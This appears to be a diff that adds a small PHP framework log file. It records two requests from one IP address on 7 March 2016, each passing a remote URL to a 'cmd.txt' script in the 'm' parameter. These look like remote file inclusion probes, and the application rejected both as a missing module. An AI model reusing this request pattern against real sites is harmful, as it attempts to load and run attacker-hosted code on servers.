@@ -1,0 +1,12 @@
+[ 2016-03-07T08:01:07+08:00 ] 200.98.129.111 /index.php?m=http://pader-g.org/templates/beez5/cmd.txt?
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
+ERR: _MODULE_NOT_EXIST_:Http://pader-g.org/templates/beez5/cmd.txt?
+
+[ 2016-03-07T09:27:43+08:00 ] 200.98.129.111 /index.php?m=http://pader-g.org/templates/beez5/cmd.txt?
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000068s ]
+ERR: _MODULE_NOT_EXIST_:Http://pader-g.org/templates/beez5/cmd.txt?
+
